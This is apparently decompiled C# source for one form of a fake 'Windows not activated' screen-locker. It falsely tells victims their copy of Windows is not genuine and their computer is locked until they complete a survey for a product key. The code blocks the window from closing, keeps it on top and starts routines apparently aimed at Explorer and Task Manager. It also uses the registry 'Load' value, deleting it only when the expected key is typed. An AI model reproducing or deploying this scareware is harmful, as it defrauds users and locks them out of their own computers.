using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Fake_Windows_Version_Detected.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Fake_Windows_Version_Detected;

[DesignerGenerated]
public class Message : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("Label7")]
	private Label _Label7;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	[AccessedThroughProperty("TextBox4")]
	private TextBox _TextBox4;

	[AccessedThroughProperty("TextBox5")]
	private TextBox _TextBox5;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("StatusStrip1")]
	private StatusStrip _StatusStrip1;

	[AccessedThroughProperty("ToolStripStatusLabel1")]
	private ToolStripStatusLabel _ToolStripStatusLabel1;

	[AccessedThroughProperty("ToolStripStatusLabel2")]
	private ToolStripStatusLabel _ToolStripStatusLabel2;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Label8")]
	private Label _Label8;

	[AccessedThroughProperty("Label9")]
	private Label _Label9;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Label10")]
	private Label _Label10;

	[AccessedThroughProperty("Label11")]
	private Label _Label11;

	private string tmpKey;

	private RegistryKey foundKey;

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual Label Label7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label7 = value;
		}
	}

	internal virtual TextBox TextBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox3 = value;
		}
	}

	internal virtual TextBox TextBox4
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox4 = value;
		}
	}

	internal virtual TextBox TextBox5
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox5 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	internal virtual StatusStrip StatusStrip1
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip1 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel1 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel2 = value;
		}
	}

	internal virtual Button Button3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button3_Click;
			if (_Button3 != null)
			{
				((Control)_Button3).remove_Click(eventHandler);
			}
			_Button3 = value;
			if (_Button3 != null)
			{
				((Control)_Button3).add_Click(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label Label8
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label8 = value;
		}
	}

	internal virtual Label Label9
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label9 = value;
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label Label10
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label10 = value;
		}
	}

	internal virtual Label Label11
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label11 = value;
		}
	}

	public Message()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Message_FormClosing));
		((Form)this).add_Load((EventHandler)Message_Load);
		__ENCAddToList(this);
		tmpKey = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
		foundKey = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey(tmpKey, writable: true);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0bce: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bd8: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Message));
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		Label4 = new Label();
		Label5 = new Label();
		Label6 = new Label();
		Label7 = new Label();
		TextBox3 = new TextBox();
		TextBox4 = new TextBox();
		TextBox5 = new TextBox();
		Button1 = new Button();
		Button2 = new Button();
		StatusStrip1 = new StatusStrip();
		ToolStripStatusLabel1 = new ToolStripStatusLabel();
		ToolStripStatusLabel2 = new ToolStripStatusLabel();
		Button3 = new Button();
		Timer1 = new Timer(components);
		Label8 = new Label();
		Label9 = new Label();
		Timer2 = new Timer(components);
		Label10 = new Label();
		Label11 = new Label();
		((Control)StatusStrip1).SuspendLayout();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		Label label = Label1;
		Point location = new Point(12, 9);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(385, 26);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("We have detected that you are not using a genuine copy of Microsoft Windows,\r\nfor this reason your computer has been temporary locked.\r\n");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(12, 51);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(324, 26);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("Your computer will stay locked until you complete a quick survey in \r\norder to get a Microsoft Windows Product Key.");
		Label3.set_AutoSize(true);
		Label label5 = Label3;
		location = new Point(11, 118);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(65, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(3);
		Label3.set_Text("Product Key");
		TextBox textBox = TextBox1;
		location = new Point(79, 115);
		((Control)textBox).set_Location(location);
		((TextBoxBase)TextBox1).set_MaxLength(4);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(37, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(4);
		TextBox textBox3 = TextBox2;
		location = new Point(126, 115);
		((Control)textBox3).set_Location(location);
		((TextBoxBase)TextBox2).set_MaxLength(4);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(37, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(5);
		Label4.set_AutoSize(true);
		Label label7 = Label4;
		location = new Point(116, 118);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(10, 13);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(6);
		Label4.set_Text("-");
		Label5.set_AutoSize(true);
		Label label9 = Label5;
		location = new Point(163, 118);
		((Control)label9).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label10 = Label5;
		size = new Size(10, 13);
		((Control)label10).set_Size(size);
		((Control)Label5).set_TabIndex(7);
		Label5.set_Text("-");
		Label6.set_AutoSize(true);
		Label label11 = Label6;
		location = new Point(256, 118);
		((Control)label11).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label12 = Label6;
		size = new Size(10, 13);
		((Control)label12).set_Size(size);
		((Control)Label6).set_TabIndex(11);
		Label6.set_Text("-");
		Label7.set_AutoSize(true);
		Label label13 = Label7;
		location = new Point(209, 118);
		((Control)label13).set_Location(location);
		((Control)Label7).set_Name("Label7");
		Label label14 = Label7;
		size = new Size(10, 13);
		((Control)label14).set_Size(size);
		((Control)Label7).set_TabIndex(10);
		Label7.set_Text("-");
		TextBox textBox5 = TextBox3;
		location = new Point(172, 115);
		((Control)textBox5).set_Location(location);
		((TextBoxBase)TextBox3).set_MaxLength(4);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox6 = TextBox3;
		size = new Size(37, 20);
		((Control)textBox6).set_Size(size);
		((Control)TextBox3).set_TabIndex(6);
		TextBox textBox7 = TextBox4;
		location = new Point(219, 115);
		((Control)textBox7).set_Location(location);
		((TextBoxBase)TextBox4).set_MaxLength(4);
		((Control)TextBox4).set_Name("TextBox4");
		TextBox textBox8 = TextBox4;
		size = new Size(37, 20);
		((Control)textBox8).set_Size(size);
		((Control)TextBox4).set_TabIndex(7);
		TextBox textBox9 = TextBox5;
		location = new Point(265, 115);
		((Control)textBox9).set_Location(location);
		((TextBoxBase)TextBox5).set_MaxLength(4);
		((Control)TextBox5).set_Name("TextBox5");
		TextBox textBox10 = TextBox5;
		size = new Size(37, 20);
		((Control)textBox10).set_Size(size);
		((Control)TextBox5).set_TabIndex(8);
		Button button = Button1;
		location = new Point(305, 113);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(89, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(9);
		((ButtonBase)Button1).set_Text("Activate");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Button button3 = Button2;
		location = new Point(12, 85);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(291, 23);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(14);
		((ButtonBase)Button2).set_Text("Click Here To Start Our Survey");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)ToolStripStatusLabel1,
			(ToolStripItem)ToolStripStatusLabel2
		});
		StatusStrip statusStrip = StatusStrip1;
		location = new Point(0, 142);
		((Control)statusStrip).set_Location(location);
		((Control)StatusStrip1).set_Name("StatusStrip1");
		StatusStrip statusStrip2 = StatusStrip1;
		size = new Size(404, 22);
		((Control)statusStrip2).set_Size(size);
		((Control)StatusStrip1).set_TabIndex(15);
		((Control)StatusStrip1).set_Text("StatusStrip1");
		((ToolStripItem)ToolStripStatusLabel1).set_Name("ToolStripStatusLabel1");
		ToolStripStatusLabel toolStripStatusLabel = ToolStripStatusLabel1;
		size = new Size(42, 17);
		((ToolStripItem)toolStripStatusLabel).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel1).set_Text("Status:");
		((ToolStripItem)ToolStripStatusLabel2).set_ForeColor(Color.Red);
		((ToolStripItem)ToolStripStatusLabel2).set_Name("ToolStripStatusLabel2");
		ToolStripStatusLabel toolStripStatusLabel2 = ToolStripStatusLabel2;
		size = new Size(83, 17);
		((ToolStripItem)toolStripStatusLabel2).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel2).set_Text("Not Activated!");
		Button button5 = Button3;
		location = new Point(305, 85);
		((Control)button5).set_Location(location);
		((Control)Button3).set_Name("Button3");
		Button button6 = Button3;
		size = new Size(89, 23);
		((Control)button6).set_Size(size);
		((Control)Button3).set_TabIndex(16);
		((ButtonBase)Button3).set_Text("Help!");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		Timer1.set_Enabled(true);
		Timer1.set_Interval(1);
		Label8.set_AutoSize(true);
		Label label15 = Label8;
		location = new Point(0, 0);
		((Control)label15).set_Location(location);
		((Control)Label8).set_Name("Label8");
		Label label16 = Label8;
		size = new Size(39, 13);
		((Control)label16).set_Size(size);
		((Control)Label8).set_TabIndex(17);
		Label8.set_Text("Label8");
		((Control)Label8).set_Visible(false);
		Label9.set_AutoSize(true);
		Label label17 = Label9;
		location = new Point(45, 0);
		((Control)label17).set_Location(location);
		((Control)Label9).set_Name("Label9");
		Label label18 = Label9;
		size = new Size(39, 13);
		((Control)label18).set_Size(size);
		((Control)Label9).set_TabIndex(18);
		Label9.set_Text("Label9");
		((Control)Label9).set_Visible(false);
		Timer2.set_Interval(1000);
		Label10.set_AutoSize(true);
		Label label19 = Label10;
		location = new Point(0, 0);
		((Control)label19).set_Location(location);
		((Control)Label10).set_Name("Label10");
		Label label20 = Label10;
		size = new Size(13, 13);
		((Control)label20).set_Size(size);
		((Control)Label10).set_TabIndex(22);
		Label10.set_Text("0");
		((Control)Label10).set_Visible(false);
		Label11.set_AutoSize(true);
		((Control)Label11).set_BackColor(Color.Transparent);
		Label label21 = Label11;
		location = new Point(1, 31);
		((Control)label21).set_Location(location);
		((Control)Label11).set_Name("Label11");
		Label label22 = Label11;
		size = new Size(403, 13);
		((Control)label22).set_Size(size);
		((Control)Label11).set_TabIndex(24);
		Label11.set_Text("__________________________________________________________________");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(404, 164);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Label11);
		((Control)this).get_Controls().Add((Control)(object)Label10);
		((Control)this).get_Controls().Add((Control)(object)Label9);
		((Control)this).get_Controls().Add((Control)(object)Label8);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)StatusStrip1);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)TextBox5);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)Label7);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox4);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Message");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("This copy of Microsoft Windows is not activated");
		((Form)this).set_TopMost(true);
		((Control)StatusStrip1).ResumeLayout(false);
		((Control)StatusStrip1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"After completing a short survey you will get access to the download link including a text file with the activation key!", (MsgBoxStyle)64, (object)"This copy of Microsoft Windows is not activated");
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			Point location = new Point(Conversions.ToInteger(Label8.get_Text()), Conversions.ToInteger(Label9.get_Text()));
			((Form)this).set_Location(location);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Message_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_00cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_018f: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(TextBox1.get_Text() + "-" + TextBox2.get_Text() + "-" + TextBox3.get_Text() + "-" + TextBox4.get_Text() + "-" + TextBox5.get_Text(), MyProject.Forms.Lock.Label2.get_Text(), false) == 0)
		{
			((Control)Button1).set_Enabled(false);
			((ToolStripItem)ToolStripStatusLabel2).set_Text("Activated!");
			((ToolStripItem)ToolStripStatusLabel2).set_ForeColor(Color.Green);
			Interaction.MsgBox((object)"The Product key you entered is valid, your computer will turn to normal within 5 seconds. If not, please restart your computer.", (MsgBoxStyle)64, (object)"This copy of Microsoft Windows is now activated");
			Timer2.Start();
			try
			{
				foundKey.DeleteValue("Load");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		Interaction.MsgBox((object)("Product key: " + TextBox1.get_Text() + "-" + TextBox2.get_Text() + "-" + TextBox3.get_Text() + "-" + TextBox4.get_Text() + "-" + TextBox5.get_Text() + " is not valid"), (MsgBoxStyle)16, (object)"This copy of Microsoft Windows is not activated");
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Timer2_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(Label10.get_Text(), "5", false) == 0)
		{
			Process.Start("C:\\Windows\\explorer.exe");
			ProjectData.EndApp();
		}
		else
		{
			Label label = Label10;
			label.set_Text(Conversions.ToString(Conversions.ToDouble(label.get_Text()) + 1.0));
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Control)MyProject.Forms.Browser).Show();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Button4_Click(object sender, EventArgs e)
	{
		ProjectData.EndApp();
	}

	private void Message_Load(object sender, EventArgs e)
	{
		Label8.set_Text(Conversions.ToString(((Form)this).get_Location().X));
		Label9.set_Text(Conversions.ToString(((Form)this).get_Location().Y));
		MyProject.Forms.Lock.Verkenner.Start();
		MyProject.Forms.Lock.taskmgr.Start();
		MyProject.Forms.Lock.Taskmgr2.Start();
	}
}
